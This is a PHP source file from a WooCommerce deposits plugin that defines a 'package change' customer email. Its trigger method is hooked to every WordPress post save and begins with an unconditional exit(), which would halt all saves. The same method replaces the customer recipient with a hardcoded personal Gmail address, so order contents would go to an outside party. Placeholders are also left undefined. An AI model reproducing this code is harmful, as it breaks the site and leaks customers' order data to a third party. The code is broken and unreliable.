<?php
/**
 * Customer Change Package Email
 *
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'AWCDP_Email_Package_Change' ) ) {

	class AWCDP_Email_Package_Change extends WC_Email {

		public function __construct() {
			$this->id          = 'awcdp_package_change';
			$this->title       = __( 'Acowebs Package Change', 'deposits-partial-payments-for-woocommerce' );
			$this->description = __( 'This emails will be sent to the customer when order package will update', 'deposits-partial-payments-for-woocommerce' );
      		$this->customer_email = true;

			//$this->template_html  = 'emails/customer-order-deposit-paid.php';
			//$this->template_plain = 'emails/plain/customer-order-deposit-paid.php';

			// Triggers for this email.
			// add_action( 'woocommerce_process_shop_order_meta',  array($this, 'trigger'));
			add_action( 'save_post',  array($this, 'trigger'));
			// add_action('woocommerce_order_status_pending_to_partially-paid_notification', array($this, 'trigger'));
			// add_action('woocommerce_order_status_failed_to_partially-paid_notification', array($this, 'trigger'));

			// Call parent constructor.
			parent::__construct();
			$this->template_base = AWCDP_PLUGIN_PATH.'/templates/';

		}


		function trigger( $order_id, $order = false ){
			exit();
			if( $order_id && !is_a($order, 'WC_Order') ){
				$order = wc_get_order($order_id);
			}

			if (is_a($order, 'WC_Order')) {
				$this->object = $order;
				$this->placeholders['{order_date}'] = wc_format_datetime($this->object->get_date_created());
				$this->placeholders['{order_number}'] = $this->object->get_order_number();
			}

			$this->recipient = $this->object->get_billing_email();
			if (!$this->is_enabled() || !$this->get_recipient()) {
				return;
			}

			//$this->send($this->get_recipient(), $this->get_subject(), $this->get_content(), $this->get_headers(), $this->get_attachments());
			$this->send("purepunjabi276@gmail.com", $this->get_subject(), $this->get_content(), $this->get_headers(), $this->get_attachments());

		}

		/*function maybe_trigger($order_id, $order = false){
			if ($order_id && !is_a($order, 'WC_Order')) {
				$order = wc_get_order($order_id);
				$this->trigger($order,$order_id);
				if( $order && $order->get_type() == AWCDP_POST_TYPE && $order->get_meta('_awcdp_deposits_payment_type', true) == 'deposit' ){
					$parent = wc_get_order($order->get_parent_id());
					$this->trigger($parent,$parent->get_id());
				}
			}
		}*/

		function get_email_text_PU(){
			$text = $this->get_option('email_text_PU', $this->get_default_email_text_PU());
			return $this->format_string($text);
		}

		function get_content_html(){

			ob_start();
			wc_get_template(
					$this->template_html ,
					array(
						'order' => $this->object,
						'email_heading' => $this->get_heading(),
						'additional_content' => '',
			            'email_text' => $this->get_email_text_PU(),
			            'payment_text' => '',
						'plain_text' => false,
						'sent_to_admin' => false,
						'email' => $this
					),
					'',
					$this->template_base
				);
				return ob_get_clean();
		}

		public function get_default_subject(){
	    	return esc_html__('Package of your order from {order_date} is {downgraded_or_upgraded}', 'deposits-partial-payments-for-woocommerce');
	    }

		public function get_default_heading(){
	    	return esc_html__('Order Package updated', 'deposits-partial-payments-for-woocommerce');
	    }

		public function get_default_email_text_PU(){
			return esc_html__('Your Package is Changed from {previous_package} to {current_package}', 'deposits-partial-payments-for-woocommerce');
	    }

		function get_content_plain(){

			ob_start();
			wc_get_template(
				$this->template_plain,
				array(
					'order' => $this->object,
					'email_heading' => $this->get_heading(),
					'additional_content' => '',
					'email_text' => $this->get_email_text_PU(),
					'payment_text' => '',
					'plain_text' => true,
					'sent_to_admin' => false,
					'email' => $this
				),
				'',
				$this->template_base
			);
			return ob_get_clean();

		}

		function init_form_fields(){

			$placeholder_text = sprintf(wp_kses(__('Placeholders available : %s', 'deposits-partial-payments-for-woocommerce'), array('code'=>array())) , '<code>' . esc_html(implode(', ', array_keys($this->placeholders))) . '</code>');

			$this->form_fields = array(
				'enabled' => array(
					'title' => esc_html__( 'Enable/Disable', 'deposits-partial-payments-for-woocommerce' ),
					'type' => 'checkbox',
					'label' => esc_html__( 'Enable this email notification' , 'deposits-partial-payments-for-woocommerce' ),
					'default' => 'yes'
				) ,
				'subject' => array(
					'title' => esc_html__( 'Subject', 'deposits-partial-payments-for-woocommerce' ),
					'type' => 'text',
					'description' => $placeholder_text,
					'placeholder' => $this->get_default_subject(),
					'default' => $this->get_default_subject(),
				),
				'heading' => array(
					'title' => esc_html__( 'Email Heading' , 'deposits-partial-payments-for-woocommerce' ),
					'type' => 'text',
					'description' => sprintf( wp_kses(__( 'Main heading contained within the email. <code>%s</code>.', 'deposits-partial-payments-for-woocommerce' ), array('code'=>array())), $placeholder_text ),
					'placeholder' => $this->get_default_heading(),
					'default' => $this->get_default_heading(),
				),
				'email_text_PU' => array(
					'title' => esc_html__('Email text', 'deposits-partial-payments-for-woocommerce'),
					'type' => 'textarea',
					'placeholder' => $this->get_default_email_text_PU(),
					'default' => $this->get_default_email_text_PU(),
					'css' => 'width:400px; height: 50px;',
				),
				'email_type' => array(
					'title' => esc_html__( 'Email type' , 'deposits-partial-payments-for-woocommerce' ),
					'type' => 'select',
					'default' => 'html',
					'class' => 'email_type',
					'options' => array(
						'plain' => esc_html__( 'Plain text' , 'deposits-partial-payments-for-woocommerce' ),
						'html' => esc_html__( 'HTML' , 'deposits-partial-payments-for-woocommerce' ),
						'multipart' => esc_html__( 'Multipart' , 'deposits-partial-payments-for-woocommerce' ),
					)
				)
			);
		}

	}
}


return new AWCDP_Email_Package_Change();
